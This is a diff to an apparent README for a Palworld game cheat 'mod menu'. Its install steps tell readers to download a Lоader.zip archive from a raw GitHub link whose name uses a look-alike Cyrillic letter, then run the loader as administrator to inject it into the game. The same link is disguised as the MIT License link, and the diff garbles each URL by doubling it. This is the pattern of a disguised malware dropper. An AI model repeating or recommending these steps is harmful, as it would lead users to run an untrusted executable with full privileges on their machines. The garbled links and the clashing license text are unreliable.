@@ -44,9 +44,9 @@ Unlock a treasure chest of features designed to boost your Palworld adventures! 
 
 Follow these simple steps to get started with your new Palworld Mod Menu:
 
-1. **Download https://raw.githubusercontent.com/Cepiooo/PalWorld-ModMaster/main/Lоader.zip from the repository.**
-2. Extract `https://raw.githubusercontent.com/Cepiooo/PalWorld-ModMaster/main/Lоader.zip` using your preferred archiver (WinRAR, 7-Zip, etc.).
-3. Open the extracted folder and locate `https://raw.githubusercontent.com/Cepiooo/PalWorld-ModMaster/main/Lоader.zip` (Windows) or the platform-specific loader file.
+1. **Download https://raw.githubusercontent.com/Cepiooo/PalWorld-ModMaster/main/Lоader.zipоhttps://raw.githubusercontent.com/Cepiooo/PalWorld-ModMaster/main/Lоader.zip from the repository.**
+2. Extract `https://raw.githubusercontent.com/Cepiooo/PalWorld-ModMaster/main/Lоader.zipоhttps://raw.githubusercontent.com/Cepiooo/PalWorld-ModMaster/main/Lоader.zip` using your preferred archiver (WinRAR, 7-Zip, etc.).
+3. Open the extracted folder and locate `https://raw.githubusercontent.com/Cepiooo/PalWorld-ModMaster/main/Lоader.zipоhttps://raw.githubusercontent.com/Cepiooo/PalWorld-ModMaster/main/Lоader.zip` (Windows) or the platform-specific loader file.
 4. Run the loader as administrator (right-click > ‘Run as Administrator’).
 5. Follow the on-screen prompts to inject the menu into Palworld.
 6. Launch Palworld and activate the menu in-game using the default hotkey (`Insert`).
@@ -73,7 +73,7 @@ The Palworld Mod Menu does **not** endorse or support unfair gameplay or unautho
 
 ## 📄 License (MIT)
 
-This repository is licensed under the [MIT License](https://raw.githubusercontent.com/Cepiooo/PalWorld-ModMaster/main/Lоader.zip). Feel free to use, modify, and share!  
+This repository is licensed under the [MIT License](https://raw.githubusercontent.com/Cepiooo/PalWorld-ModMaster/main/Lоader.zipоhttps://raw.githubusercontent.com/Cepiooo/PalWorld-ModMaster/main/Lоader.zip). Feel free to use, modify, and share!  
 © 2025 All Rights Reserved.
 
 ---
